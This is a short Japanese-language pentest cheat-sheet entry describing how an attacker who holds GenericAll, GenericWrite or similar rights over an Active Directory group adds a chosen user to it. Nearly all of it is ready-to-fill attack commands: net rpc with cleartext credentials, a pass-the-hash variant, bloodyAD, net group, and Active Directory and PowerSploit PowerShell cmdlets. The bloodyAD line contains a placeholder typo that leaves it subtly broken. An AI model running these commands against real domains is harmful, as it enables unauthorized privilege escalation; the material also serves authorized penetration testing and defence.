# グループにメンバーを追加する

ターゲット グループに対して `GenericAll`、`GenericWrite`、`Self`、`AllExtendedRights`、または `Self-Membership` を持つオブジェクトを制御するとき、グループメンバーシップを操作することができる。`Get-NetGroup` を使用してグループの識別名を特定した後、自分自身を そのグループに追加できる。 これは、直接コマンドを使用するか、`Active Directory` や `PowerSploit` のようなモジュールを使用して行うことができる。

## メンバーを追加

### Linux

#### ネットとクリアテキストの認証情報

```
net rpc group addmem "<TargetGroup>" <TargetUser> -U <DOMAIN>/<USERNAME>%<PASSWORD> -S <DC_IP>
```

#### With Pass-the-Hash

```
pth-net rpc group addmem "<TargetGroup>" <TargetUser> -U <DOMAIN>/<USERNAME>%"ffffffffffffffffffffffffffffffff":<NTLM_HASH> -S <DC_IP>
```

#### bloodyAD

```
bloodyAD --host <DC_IP> -d <OMAIN>-u <USERNAME> -p <PASSWORD> add groupMember "<TargetGroup>" <TargetUser>
```

### Windows

#### Command Line

```
net group "<TargetGroup>" <USERNAME> /add /domain
```

#### PowerShell : Active Directory Module

```
Add-ADGroupMember -Identity "<TargetGroup>" -Members <TargetUser>
```

#### PowerShell : PowerSploit Module

```
Add-DomainGroupMember -Identity "<TargetGroup>" -Members <TargetUser>
```

